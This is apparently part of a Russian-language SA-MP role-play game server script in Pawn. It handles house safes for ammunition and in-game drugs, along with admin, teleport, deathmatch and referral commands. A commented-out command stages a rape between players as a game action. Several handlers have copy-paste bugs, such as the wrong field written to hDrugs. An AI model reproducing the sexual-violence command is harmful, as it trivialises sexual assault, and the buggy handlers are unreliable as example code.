		case DIALOG_TAKE_CUPBOARD_PATRONS:
		{
			if(!response)
			{
				return ShowCupboard(playerid);
			}
			if(response)
			{
				new id = GetPVarInt(playerid, "safeid"), newslot;
				if(!strlen(inputtext) || !IsTextNumeric(inputtext)) return ShowCupboard(playerid);
				if(HouseInfo[id][hPatrons] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "В сейфе нет такого количества патронов");
				if(CheckMaxVes(playerid,27,strval(inputtext),newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
                HouseInfo[id][hPatrons] -= strval(inputtext);
				GiveItem(playerid, 27, strval(inputtext));
				new fmt_msg[70];
				mysql_format(dbHandle, fmt_msg, sizeof fmt_msg, "UPDATE `house` SET `hPatrons` = '%d' WHERE `id` = '%d'", HouseInfo[id][hPatrons], HouseInfo[id][hID]);
				mysql_query(dbHandle, fmt_msg, false);
				format(fmt_msg, sizeof fmt_msg, "Вы взяли из сейфа %d патронов", strval(inputtext));
				SendClientMessage(playerid, COLOR_GREEN, fmt_msg);
				if(HouseInfo[id][hDiscript] != 4) UpdateCupboard(id);
				SaveItem(playerid,newslot);
				return ShowCupboard(playerid);
			}
		}
		case DIALOG_PUT_CUPBOARD_PATRONS:
		{
			if(!response)
			{
				return ShowCupboard(playerid);
			}
			if(response)
			{
				new id = GetPVarInt(playerid, "safeid"), ok;
				for(new s = 16; s > 0; s --)
	            {
	   				if(PlayerItem1[playerid][s]==27){ok=s;break;}
	   			}
				if(!strlen(inputtext) || !IsTextNumeric(inputtext)) return ShowCupboard(playerid);
				if(!(1 <= strval(inputtext) <= 500)) return SendClientMessage(playerid, COLOR_GREY, "Вы можете положить в сейф от 1 до 500 патронов");
				if(HouseInfo[id][hPatrons] + strval(inputtext) > 1500) return SendClientMessage(playerid, COLOR_GREY, "Сейф может вместить только 1500 патронов");
                if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько патронов");
				if(PlayerItem2[playerid][ok] == 0)
	   			{
	   				PlayerItem1[playerid][ok]=0;
	   			}
				HouseInfo[id][hPatrons] += strval(inputtext);
   				PlayerItem2[playerid][ok] -= strval(inputtext);
				new fmt_msg[70];
				mysql_format(dbHandle, fmt_msg, sizeof fmt_msg, "UPDATE `house` SET `hPatrons` = '%d' WHERE `id` = '%d'", HouseInfo[id][hPatrons], HouseInfo[id][hID]);
				mysql_query(dbHandle, fmt_msg, false);
				format(fmt_msg, sizeof fmt_msg, "Вы положили в сейф %d патронов", strval(inputtext));
				SendClientMessage(playerid, COLOR_GREEN, fmt_msg);
				if(HouseInfo[id][hDiscript] != 4) UpdateCupboard(id);
				SaveItem(playerid,ok);
				return ShowCupboard(playerid);
			}
		}
		case DIALOG_TAKE_CUPBOARD_HDRUGS:
		{
			if(!response)
			{
				return ShowCupboard(playerid);
			}
			if(response)
			{
				new id = GetPVarInt(playerid, "safeid"), newslot;
				if(!strlen(inputtext) || !IsTextNumeric(inputtext)) return ShowCupboard(playerid);
				if(HouseInfo[id][hDrugs] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "В сейфе нет такого количества тяжёлых наркотиков");
                if(CheckMaxVes(playerid,44,strval(inputtext),newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
				PlayerItem1[playerid][newslot]=44;
				PlayerItem2[playerid][newslot]+=strval(inputtext);
				HouseInfo[id][hDrugs] -= strval(inputtext);
				new fmt_msg[70];
				mysql_format(dbHandle, fmt_msg, sizeof fmt_msg, "UPDATE `house` SET `hDrugs` = '%d' WHERE `id` = '%d'", HouseInfo[id][hPatrons], HouseInfo[id][hID]);
				mysql_query(dbHandle, fmt_msg, false);
				format(fmt_msg, sizeof fmt_msg, "Вы взяли из шкафа %d грамм тяжёлых наркотиков", strval(inputtext));
				SendClientMessage(playerid, COLOR_GREEN, fmt_msg);
				if(HouseInfo[id][hDiscript] != 4) UpdateCupboard(id);
				SaveItem(playerid,newslot);
				return ShowCupboard(playerid);
			}
		}
		case DIALOG_PUT_CUPBOARD_HDRUGS:
		{
			if(!response)
			{
				return ShowCupboard(playerid);
			}
			if(response)
			{
				new id = GetPVarInt(playerid, "safeid"), ok;
				for(new s = 16; s > 0; s --)
	            {
	   				if(PlayerItem1[playerid][s]==27){ok=s;break;}
	   			}
				if(!strlen(inputtext) || !IsTextNumeric(inputtext)) return ShowCupboard(playerid);
				if(!(1 <= strval(inputtext) <= 1000)) return SendClientMessage(playerid, COLOR_GREY, "Вы можете положить в сейф от 1 до 1000 грамм тяжёлых наркотиков");
				if(PI[playerid][pDrugs] < strval(inputtext)) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет такого количества тяжёлых наркотиков");
				if(HouseInfo[id][hDrugs] + strval(inputtext) > 3000) return SendClientMessage(playerid, COLOR_GREY, "Сейф может вместить только 3000 грамм тяжёлых наркотиков");
				if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько патронов");
				if(PlayerItem2[playerid][ok] == 0)
	   			{
	   				PlayerItem1[playerid][ok]=0;
	   			}
	   			HouseInfo[id][hDrugs] += strval(inputtext);
   				PlayerItem2[playerid][ok] -= strval(inputtext);
				new fmt_msg[70];
				mysql_format(dbHandle, fmt_msg, sizeof fmt_msg, "UPDATE `house` SET `hDrugs` = '%d' WHERE `id` = '%d'", HouseInfo[id][hDrugs], HouseInfo[id][hID]);
				mysql_query(dbHandle, fmt_msg, false);
				format(fmt_msg, sizeof fmt_msg, "Вы положили в шкаф %d тяжёлых наркотиков", strval(inputtext));
				SendClientMessage(playerid, COLOR_GREEN, fmt_msg);
				if(HouseInfo[id][hDiscript] != 4) UpdateCupboard(id);
				SaveItem(playerid,ok);
				return ShowCupboard(playerid);
			}
		}
	}
	return 1;
}

forward ReFill(playerid);
public ReFill(playerid)
{
	new string[32];
	GetVehicleData(GetPlayerVehicleID(playerid), veh_fuel)++;
	SetPVarInt(playerid, "Filling", GetPVarInt(playerid, "Filling") + 1);
	format(string,32,"Fill: %i",GetPVarInt(playerid, "Filling"));
	GameTextForPlayer(playerid, string, 600, 6);
	if(GetPVarInt(playerid, "Refueling") <= GetPVarInt(playerid, "Filling"))
	{
		KillTimer(ReFuelTimer[playerid]);
		DeletePVar(playerid, "Refueling");
		DeletePVar(playerid, "Filling");
		TogglePlayerControllable(playerid, true);
	}
	return 1;
}

public OnPlayerCommandReceived(playerid, cmd[], params[], flags)
{
    if(PlayerLogged[playerid] == false) return 0;

	return 1;
}
// - Все команды

/*CMD:iznas(playerid, params[])
{
	if(!strlen(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /iznas [ид игрока]");

	extract params -> new to_player;

	if(IsPlayerInAnyVehicle(playerid))
		return SendClientMessage(playerid, C_RED, "Нельзя использовать в машине");

	if(PlayerLogged[to_player] == false || playerid == to_player)
		return SendClientMessage(playerid, C_RED, "Такого игрока нет");

	if(!IsPlayerInRangeOfPlayer(8.0, playerid, to_player)) return SendClientMessage(playerid, C_RED, "Игрок слишком далеко");

	new Float: angle;
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(to_player, angle + 180);

	ApplyAnimation(to_player, "SNM", "SPANKINGW",4.1,0,1,1,1,1,1);
	ApplyAnimation(playerid, "SNM", "SPANKEDW",4.1,0,1,1,1,1,1);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "изнасиловал(а) %s", GetName(to_player));
	MeAction(playerid, STRING_GLOBAL);

	return true;
}*/

CMD:raycoins(playerid)
{
	return ShowPlayerCoinsList(playerid);
}

CMD:rlock(playerid)
{
	if(PI[playerid][P_ENTRANCE] == -1 && PI[playerid][P_ROOM] == -1)
		return SendClientMessage(playerid, C_RED, "У Вас нет квартиры");

	new entranceid = PI[playerid][P_ENTRANCE],
		roomid = PI[playerid][P_ROOM];

	if(GetRoomData(entranceid, roomid, ER_LOCK) == true)
	{
		SetRoomData(entranceid, roomid, ER_LOCK, false);

		SendClientMessage(playerid, 0xFF6600FF, "Квартира закрыта");
	}
	else
	{
		SetRoomData(entranceid, roomid, ER_LOCK, true);

		SendClientMessage(playerid, 0x66CC00FF, "Квартира открыта");
	}

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE `rooms` SET `lock` = '%d' WHERE `id` = '%d' ", bool: GetRoomData(entranceid, roomid, ER_LOCK), GetRoomData(entranceid, roomid, ER_SQL_ID));
	mysql_query(dbHandle, STRING_GLOBAL);

	return 1;
}

CMD:use(playerid)
{
    new number_house = 0;
    for(new v = TOTALHOUSE; v > 0; v --)
	{
 		if(!strcmp(HouseInfo[v][hOwner],GetName(playerid),true)) number_house = v;
	}
    if(GetPVarInt(playerid, "PlayerHouse") == 0) return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы находитесь на улице");
    new i = GetPVarInt(playerid, "PlayerHouse"), id = number_house;
	if(HouseInfo[i][hID] != HouseInfo[id][hID] && HouseInfo[i][hCS] == 1) return SendClientMessage(playerid, COLOR_DARKORANGE, "Этот сейф закрыт");

	if(strcmp(HouseInfo[i][hOwner], GetName(playerid), true))
		return SendClientMessage(playerid, C_RED, "Пользоваться сейфом может только владелец");

	if((!IsPlayerInRangeOfPoint(playerid,60.0,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]) || IsPlayerInRangeOfPoint(playerid,3.0,2934.4077,2967.4949,3176.5769)) && GetPlayerVirtualWorld(playerid) == HouseInfo[i][hVirtual]) return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы должны быть в доме");
	if(!IsPlayerInRangeOfPoint(playerid, 2.0, housecupboard[HouseInfo[id][hDiscript]][0], housecupboard[HouseInfo[id][hDiscript]][1],housecupboard[HouseInfo[id][hDiscript]][2])) return SendClientMessage(playerid, COLOR_GREY, "Вы далеко от сейфа");
	ShowPlayerDialog(playerid, DIALOG_CUPBOARD, DIALOG_STYLE_LIST, "{FFCC00}Сейф",
	"{0099FF}1. {FFFFFF}Взять деньги\n\
	{0099FF}2. {FFFFFF}Положить деньги\n\
	{0099FF}3. {FFFFFF}Взять патроны\n\
	{0099FF}4. {FFFFFF}Положить патроны\n\
	{0099FF}5. {FFFFFF}Взять наркотики\n\
	{0099FF}6. {FFFFFF}Положить наркотики", "Далее", "Отмена");
	SetPVarInt(playerid, "safeid", id);
	return 1;
}

CMD:mutelist(playerid)
{
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new list,full,str[100];

	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pMuted] >= 0) list++;
	}
	STRING_GLOBAL[0] = EOS;
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pMuted] >= 0)
		{
			format(str,sizeof(str),"{ffffff}%s[%i] - {FF6347}TIME: %s\n",PI[i][pName], i, Converts(PI[i][pMuted]));
			strcat(STRING_GLOBAL, str);
			full++;
		}
	}
	if(full == 0) strcat(STRING_GLOBAL, "{ffffff}Информация не найдена");
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"MUTE LIST",STRING_GLOBAL,"Закрыть","");
	return 1;
}

CMD:pp(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
    new string[128];
    format(string, sizeof(string), "Администратор %s пожелал(а) вам приятной игры на сервере, спасибо вам что вы с нами :3");
    SendClientMessageToAll(0xffa500FF, string);

    return 1;
}
CMD:jaillist(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	new list,full,str[100];

	STRING_GLOBAL[0] = EOS;
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pJail])
		{
			format(str,sizeof(str),"{ffffff}%s[%i] - {FF6347}TIME: %s\n",PI[i][pName], i, Converts(PI[i][pJailTime]));
			strcat(STRING_GLOBAL, str);
			full++;
			list++;
		}
	}
	if(full == 0) strcat(STRING_GLOBAL, "{ffffff}Информация не найдена");
	ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"JAIL LIST",STRING_GLOBAL,"Закрыть","");
	return 1;
}

CMD:baton(playerid)
{
    if(PI[playerid][pMember] != TEAM_POLICIA)
	    return SendClientMessage(playerid, COLOR_DARKORANGE, "Вы не состоите в ДПС!");
    if(!IsPlayerAttachedObjectSlotUsed(playerid, 1))
	    return SendClientMessage(playerid, COLOR_DARKORANGE, "У Вас нет с собой жезла");

	if(Baton[playerid] == false)
	{
	    ApplyAnimation(playerid, "PED", "Driveby_R", 4.1, 0, 1, 1, 1, 1, 1);
	    Baton[playerid] = true;
	}
	else if(Baton[playerid] == true)
	{
	    ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
	    Baton[playerid] = false;
	}

	return 1;
}

CMD:controlmost(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 7) return 1;
	switch(SDvers[4])
	{
		case 0:
		{
			MoveObject(Dvers[4],2747.34448242,-1142.90002441,22.6000002, 0.1, 55.00000000,0.00000000,180.00000000);
			MoveObject(Dvers[5],2747.30004883,-1262.00000000,22.6000002, 0.1, 55.00000000,0.00000000,0.00000000 );
			SDvers[4] = 1;
		}
		case 1:
		{
			MoveObject(Dvers[4],2747.34448242, -1142.90002441, 21.60000038, 0.1, 0.00000000, 0.00000000, 180.00000000 );
			MoveObject(Dvers[5],2747.30004883, -1262.00000000, 21.60000038, 0.1, 0.00000000,0.00000000,0.00000000 );
			SDvers[4] = 0;
		}
	}
	return 1;
}
CMD:tp(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	ShowPlayerDialog(playerid, D_JOB+139, DIALOG_STYLE_LIST, "Телепорт", "1. Важные места\n2. Базы организаций\n3. Развлечения\n4. Города\n5. Поселки и деревни", "Выбрать", "Отмена");
	return 1;
}
CMD:agivevoen(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 3) return 1;
    else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /agivevoen [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pVoennik]) return SendClientMessage(playerid, COLOR_GREY, "У игрока уже имеется военный билет!");
	PI[params[0]][pVoennik] = 1;
	MysqlUpdatePlayerInt(params[0], "Voennik", PI[params[0]][pVoennik]);
	SendClientMessage(params[0], COLOR_LIME, "Администратор выдал вам военный билет! Теперь Вы сможете работать в Полиции!");
	SendClientMessage(playerid, COLOR_GREEN, "Вы выдали военный билет!");
    return 1;
}

CMD:aduty(playerid)
{
	if(admin_ban_time[playerid] > 0) return SCM(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 1) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);

	STRING_GLOBAL[0] = EOS;

	if(PI[playerid][pAduty] == 1)
	{
		SetPlayerColor(playerid, 0xFFFFFFFF);
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s {FF0000}%s[%d] {FFFFFF}ушёл с дежурства.", GetAdminRank(playerid), GetName(playerid), playerid);
		SCM(playerid, COLOR_WHITE, STRING_GLOBAL);
		PI[playerid][pAduty] = 0;
	}
	else if(PI[playerid][pAduty] == 0)
	{
		SetPlayerColor(playerid, 0x000000FF);
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s {FF0000}%s[%d] {FFFFFF}выходит на дежурство. Задать вопрос /report", GetAdminRank(playerid), GetName(playerid), playerid);
		SCM(playerid, COLOR_WHITE, STRING_GLOBAL);
		PI[playerid][pAduty] = 1;
	}
	return 1;
}

cmd:dc(playerid,params[])
{
    if(DMZone[playerid] == 1)
	{
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "{9ACD32}Введите: {FFFFFF} /dc [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid, COLOR_GREY, "Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new fmt_msg[128];
		format(fmt_msg, sizeof(fmt_msg), "{FF0000}[DM ZONE]{32CD32}[Рация] {FFFFFF}| %s[%d]: %s", GetName(playerid), playerid, params[0]);
		SendClientMessageToAll(COLOR_ORANGE, fmt_msg);
		SetString(OldMessage[playerid], params[0]);
		TextReset[playerid] = gettime()+3;
	}
	return 1;
}

cmd:mes(playerid)
{
	if(PI[playerid][pVK] == 1) return SCM(playerid, C_OSNOV, "Вы вышли с соц.сети \"ВКонтакте\""), PI[playerid][pVK] = 0;
	if(PI[playerid][pVK] == 0) return SCM(playerid, C_OSNOV, "Вы авторизовались в соц.сети \"ВКонтакте\""), PI[playerid][pVK] = 1;
	return 1;
}

cmd:vkhelp(playerid)
{
	STRING_GLOBAL[0] = EOS;
	strcat(STRING_GLOBAL, "{FFCC00}Помощь по соц.сети \"ВКонтакте\"\n\n");
	strcat(STRING_GLOBAL, "{FFCC00}/mes {FFFFFF}- Авторизоваться/Выйти с соц.сети\n");
	strcat(STRING_GLOBAL, "{FFCC00}/vk [текст] {FFFFFF}- Отправить сообщение\n");
	strcat(STRING_GLOBAL, "Здесь Вы можете общаться с другими игроками на сервере\n\n");
	strcat(STRING_GLOBAL, "{FFCC00}Примечание:\n");
	strcat(STRING_GLOBAL, "{FFFFFF}Сообщения отправленые в соц.сети, показаны только тем\n");
	strcat(STRING_GLOBAL, "{FFFFFF}кто авторизовался. Так-же запрещен флуд и оскорбления\n");
	SPD(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{FFFFFF}Соц.сеть {FFCC00}\"ВКонтакте\"", STRING_GLOBAL, "Назад", "Закрыть");
	return true;
}

CMD:godm(playerid)
{
	if(DMZone[playerid] == 1)
 	{
		SendClientMessage(playerid, C_OSNOV,"Вы уже находитесь на DM зоне. Чтобы покинуть DM зону введите: /exitdm");
   	}
   	else
   	{
   		switch(random(2))
	    {
	        case 0:
	        {
				SetPlayerPos(playerid, 2113.8503,-2706.0762,954.0625);
				SetPlayerFacingAngle(playerid, 176.0734);
			}
			case 1:
			{
			    SetPlayerPos(playerid, 2107.3396,-2792.7085,954.0938);
				SetPlayerFacingAngle(playerid, 354.1169);
			}
		}
   	    DMZone[playerid] = 1;
        GivePlayerWeapon(playerid, 24, 5000);   //Дигл
        GivePlayerWeapon(playerid, 17, 1000);   //Дымовуха
        GivePlayerWeapon(playerid, 34, 1000);   //Снайперка
		GivePlayerWeapon(playerid, 30, 5000);   //Калаш
        SetPlayerHealth(playerid, 100);
        SendClientMessage(playerid, C_OSNOV,"Вы вошли на DM зону, приятной игры.");
	}
	return 1;
}

CMD:exitdm(playerid)
{
   if(DMZone[playerid] == 0)
   {
       SendClientMessage(playerid, COLOR_RED, "Вы не на DM зоне! Введите: /godm");
   }
   else
   {
   		DMZone[playerid] = 0;
        SpawnPlayer(playerid);
        GetPlayerWeapon(playerid);
        SendClientMessage(playerid, C_OSNOV, "Вы вышли с DM зоны, приятной игры.");
   }
   return 1;
}
/*CMD:referals(playerid, params[])
{
	STRING_GLOBAL = "";
    new tName[24], tLevel;
    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "SELECT `name`, `level` FROM `accounts` WHERE `referal` = '%s'", GetName(playerid));
	new Cache:result = mysql_query(dbHandle, STRING_GLOBAL);
	new accounts = cache_get_row_count(dbHandle);
	if(accounts == 0) return SendClientMessage(playerid, C_OSNOV, "Вас никто не указывал как реферала!");

	STRING_GLOBAL = "";
    for(new i; i < accounts; i ++)
	{
  		cache_get_field_content(i, "name", tName, dbHandle, 32);
		tLevel = cache_get_field_content_int(i, "level", dbHandle);

        if(tLevel < 3) format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFFFF}%s - %s {FFCC00}%d LVL\n", STRING_GLOBAL, tName, tLevel);
        else format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "{FFFFFF}%s - {FFCC00}%d LVL\n", STRING_GLOBAL, tName, tLevel);
    }
	cache_delete(result, dbHandle);
    ShowPlayerDialogEx(playerid, D_NULL, 2, "{FFCC00}>> Приглашенные игроки", STRING_GLOBAL, "Принять", "");
	return 1;
}*/
CMD:referals(playerid, params[])
{
    new fmt_str[600], Name[24], Level;
    format(fmt_str, sizeof(fmt_str), "SELECT `name`, `level` FROM `accounts` WHERE `referal` = '%s' LIMIT 10", GetName(playerid));
	new Cache:result = mysql_query(dbHandle, fmt_str);
	STRING_GLOBAL = "";
	new accounts = cache_get_row_count(dbHandle);
	if(accounts == 0) return SendClientMessage(playerid, C_OSNOV, "Больше вас никто не указывал как реферала");
	fmt_str[0] = 0; FirstReferal[playerid] = 0;
    for(new i; i < accounts; i ++)
	{
		cache_get_row(i, 0, Name, dbHandle);
		Level = cache_get_row_int(i, 1, dbHandle);
        if(Level < 3) format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}%i. %s - {FF0000}%d level\n", STRING_GLOBAL, i+1, Name, Level);
        else format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}%i. %s - {33AA33}%d level\n", STRING_GLOBAL, i+1, Name, Level);
    }
	cache_delete(result, dbHandle);
    ShowPlayerDialogEx(playerid, 69, 0, "Приглашенные", fmt_str, "Далее", "Назад");
	return true;
}
CMD:setworld(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 4) return 1;
    if(sscanf(params, "ii", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /setworld [вирт. мир] [инт]");
	SetPlayerVirtualWorld(playerid, params[0]);
	SetPlayerInterior(playerid, params[1]);
    return 1;
}
CMD:myworld(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 4) return 1;
    SendMes(playerid, COLOR_WHITE, "Вирт.мир:%d | Интерьер:%d",GetPlayerVirtualWorld(playerid),GetPlayerInterior(playerid));
    return 1;
}
CMD:givevoen(playerid, params[])
{
	if(PI[playerid][pMember] != TEAM_ARMIYA) return 1;
    else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /givevoen [id игрока]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(PI[params[0]][pVoennik]) return SendClientMessage(playerid, COLOR_GREY, "У игрока уже имеется военный билет!");
	else if(PI[params[0]][pMember] != TEAM_ARMIYA) return SendClientMessage(playerid, COLOR_GREY, "Игрок не служит в армии!");
	else if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находиться в транспорте!");
	else if(!IsPlayerInRangeOfPlayer(8.0, playerid, params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок слишком далеко!");
	if(PI[playerid][pMember] == TEAM_ARMIYA && PI[playerid][pRank] >= 10)
	{
        PI[params[0]][pVoennik] = 1;
		MysqlUpdatePlayerInt(params[0], "Voennik", PI[params[0]][pVoennik]);
		SendClientMessage(params[0], COLOR_LIME, "Вам выдали военный билет! Теперь Вы сможете работать в Полиции!");
		SendClientMessage(playerid, COLOR_GREEN, "Вы выдали военный билет!");
	}
    else SendClientMessage(playerid, COLOR_GREY, "Вы не можете выдавать военный билет!");
    return 1;
}

CMD:mp(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 1) return 1;
    ShowPlayerDialog(playerid,9994,DIALOG_STYLE_LIST,"Меню мероприятия","1. Создать/Удалить точку телепорта\n2. Заморозить игроков (50м)\n3. Выдать игрокам 100ХП (50м)\n4. Выдать игрокам 100БР (50м)\n5. Выдать игрокам оружие","Выбрать","Закрыть");
    return true;
}

CMD:settp(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 1) return 1;
    if(Teleport == 0)
    {
        GetPlayerPos(playerid, TeleportFloat[0], TeleportFloat[1], TeleportFloat[2]); // Записываем координаты
        TeleportInfo[0] = GetPlayerInterior(playerid); // Записываем интерьер
        TeleportInfo[1] = GetPlayerVirtualWorld(playerid); // Записываем виртуальный мир
        Teleport = 1;
        new string[120];
        format(string, sizeof(string), "[A] %s[%d] установил точку телепорта для игроков. {0abf12}ТП включен.", GetName(playerid), playerid);
        SendAdminMessage(COLOR_GREY, string);

		Iter_Clear(EventPlayers);
    }
    else
    {
		new string[120];
		format(string, sizeof(string), "[A] %s[%d] удалил точку телепорта для игроков. {c16e38}ТП отключен.", GetName(playerid), playerid);
		SendAdminMessage(COLOR_GREY, string);
		Teleport = 0;
		return true;
    }

    return true;
}
/*CMD:quest(playerid)
{
    new num;
    STRING_GLOBAL[0] = EOS;
    for(new i;i < MAX_QUESTS; i++)
    {
        if(AcceptQuest[playerid][i] != 0 && QuestProgress[playerid][i] != 100)
        {
            if(QuestProgress[playerid][i]<QI[i][LastProgress]) format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"%s\n{FFFFFF}%s | {DA9815}Прогресс: %i/%i", STRING_GLOBAL, QI[i][QuestName], QuestProgress[playerid][i],QI[i][LastProgress]);
            else if(QuestProgress[playerid][i]==100) format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"%s\n{FFFFFF}%s | {E81818}[Выполнен]", STRING_GLOBAL, QI[i][QuestName]);
            else format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"%s\n{FFFFFF}%s | {DA9815}Прогресс: {DA9E30}[Можно завершить]", STRING_GLOBAL, QI[i][QuestName]);
            QuestShow[playerid][num]=i;
            num++;
        }
    }
    if(strlen(STRING_GLOBAL) > 0) SPD(playerid, 7650, 2, !"", STRING_GLOBAL, !"{0F9435}Info{FFFFFF}", !"Отмена");
    else SPD(playerid, 0, 0, !"", !"{FFFFFF}У вас нет принятых квестов!", !"Принять", !"");
    return 1;
}*/
CMD:gotomp(playerid)
{
    if(PI[playerid][pJail] > 0) return SendClientMessage(playerid, COLOR_GREY, "Заключённым нельзя телепортироваться");
    if(Teleport == 0) return true;
    else
    {
	    SetPlayerPos(playerid, TeleportFloat[0], TeleportFloat[1], TeleportFloat[2]);
	    SetPlayerInterior(playerid, TeleportInfo[0]);
	    SetPlayerVirtualWorld(playerid, TeleportInfo[1]);

		Iter_Add(EventPlayers, playerid);
    }
    return true;
}

CMD:cars(playerid, params[])
{
	ShowPlayerListOwnbaleCar(playerid, D_FIXCAR);

	return 1;
}
CMD:fixcopter(playerid, params[])
{
	if(PI[playerid][PlayerCopterID] == INVALID_VEHICLE_ID)
	{
		new rows;
		new Cache: result;

		STRING_GLOBAL[0] = EOS;
		mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM copters WHERE owner_name='%s'", GetName(playerid));
		result = mysql_query(dbHandle, STRING_GLOBAL);

		rows = cache_num_rows();

		if(!rows)
			return SendClientMessage(playerid, C_RED, "У Вас нет личного вертолета"), cache_delete(result);

		for(new idx; idx < rows; idx ++)
		{
			PI[playerid][PlayerCopterID] =
			CreateVehicle
			(
				cache_get_row_int(idx, 2),
				cache_get_row_float(idx, 5, dbHandle),
				cache_get_row_float(idx, 6, dbHandle),
				cache_get_row_float(idx, 7, dbHandle),
				cache_get_row_float(idx, 8, dbHandle),
				cache_get_row_int(idx, 3),
				cache_get_row_int(idx, 4),
				90000
			);

			return SendClientMessage(playerid, 0xFFCC00FF, "Вы загрузили вертолет");
		}
	}
	else
	{
		DestroyVehicle(PI[playerid][PlayerCopterID]);
		PI[playerid][PlayerCopterID] = INVALID_VEHICLE_ID;
		return SendClientMessage(playerid, 0xFFCC00FF, "Вы выгрузили вертолет");
	}

	return 1;
}

CMD:reset_bank_door(playerid, params[])
{
	if(PI[playerid][pAdmin] < 4)
		return 1;

	if(door_bank_status != 1)
		return SendClientMessage(playerid, C_RED, "Дверь в банке не взорвана");

	door_bank_status = 0;
